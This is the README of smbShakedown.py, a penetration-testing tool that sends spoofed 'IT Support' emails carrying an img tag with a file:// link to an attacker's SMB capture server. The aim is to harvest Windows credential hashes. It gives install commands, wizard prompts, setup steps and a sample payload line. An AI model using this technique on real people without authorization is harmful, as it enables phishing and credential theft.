#smbShakedown.py
    Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
    Created by: Nick Sanzotta / @beamr
    Version: smbShakedown.py v 1.0
#Installation
    git clone https://github.com/NickSanzotta/smbShakedown.git
    cd smbShakedown/
    python smbShakedown.py
    
#Usage
        Launch smbShakedown.py and follow the wizard:
        
        Enter SMTP Server address[smtp.gmail.com]: mail.smtp.com
        ENTERED: "mail.smtp.com"

        Enter your SMTP Server Port[587]: 2525
        ENTERED: "2525"

        Enter SMTP Server username[user@gmail.com]: beamr@gmail.com
        ENTERED: "beamr@gmail.com"

        Enter SMTP Server password: 

        Enter SMB Capture Server IP address[10.0.0.7]: 
        ENTERED:10.0.0.7

        Enter "from name":[IT Support]
        ENTERED:IT Support

        Enter "from address":[itsupport@company.com]support@company123.com
        ENTERED:support@company123.com

        Enter recipient(s) name[Bob]: Nick
        ENTERED:Nick
        
        etc..

#External Pentest
    Virtual Private Server (VPS) recommended.
    If behind a firewall be sure to enable port forwarding for your SMB Capture Server:
    
    1.Configure SMTP Relay server address:
    
    2.Enter SMTP Relay server credentials: 
    (anonymous connections not yet supported.)
    
    3.Configure "from" and "to" addresses:
    
    4.Enter SMBCapture Server IP address, so it can be placed in body of email: 
    EX: <img src=file://127.0.0.1/image/foo.gif>
    *Verify this is the external IP address*
    
    5.SMBCapture Server does not have to be hosted locally:
    EX: Use a VPS

#Internal Pentest
    1.Configure SMTP Server, smarthost/localhost/other:
    (Looking into intergrating smtpd for local SMTP server option)
    
    2.Enter SMTP Server credentials: 
    (anonymous connections not yet supported.)
    
    3.Configure "from" and "to" addresses:
    
    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
    EX: <img src=file://127.0.0.1/image/foo.gif>
    
    5.SMBCapture Server can be hosted locally:
    EX: Metasploit's SMB Capture server can be configured to automatically launch.

#To do:
    SMTP Anonymous Auth option
    Add smtplib error handling
    Multiple recipient address support.
    SMTP local server option
    Create forked version.
